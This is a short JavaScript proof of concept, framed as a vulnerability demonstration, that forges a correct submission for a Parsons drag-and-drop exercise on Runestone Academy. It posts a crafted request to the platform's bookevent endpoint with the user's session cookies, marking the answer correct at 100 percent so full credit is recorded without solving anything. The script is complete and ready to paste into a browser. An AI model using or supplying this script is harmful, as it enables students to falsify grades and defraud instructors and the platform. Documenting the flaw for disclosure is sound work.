// Proof of Concept: Parsons Problem Spoofing in Runestone Academy
//
// This PoC demonstrates a client-side vulnerability in the Parsons (drag-and-drop code ordering) activity.
// Users can forge a correct solution submission by posting directly to the `bookevent` endpoint,
// bypassing actual interaction or correct code ordering.
//
// Spoof Behavior:
// - The "answer", "source", and "act" fields can be arbitrary.
// - The presence of `"correct": "T"` and `"percent": 1` is enough to receive full credit.

(async () => {
    // Prompt user to enter the Parsons activity ID (e.g., "oopex3muc")
    const divId = prompt("Enter Question ID (div_id):");

    // Get assignment ID from the URL
    const urlParams = new URLSearchParams(window.location.search);
    const assignmentId = urlParams.get("assignment_id") || urlParams.get("_id");

    if (!divId) {
        alert("No question ID entered. Run again.");
        return;
    }

    if (!assignmentId) {
        alert("Assignment ID not found.");
        return;
    }

    await fetch("https://runestone.academy/ns/logger/bookevent", {
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": `https://runestone.academy/assignment/student/doAssignment?assignment_id=${assignmentId}`
        },
        credentials: "include",
        body: JSON.stringify({
            event: "parsons",
            div_id: divId,
            answer: "0_1_0-5_0", // Arbitrary
            source: "2_0-3_0-4_0", // Arbitrary
            adaptive: "c2-s",
            correct: "T",
            act: "correct|2_0-3_0-4_0|0_1_0-5_0|c2-s", // Matches answer/source/adaptive but does not matter
            course_name: eBookConfig.course,
            clientLoginStatus: true,
            timezoneoffset: 4,
            percent: 1,
            assignment_id: assignmentId
        })
    });

    alert("Spoofed Parsons submission sent. Refresh the page to see updated score.");
})();
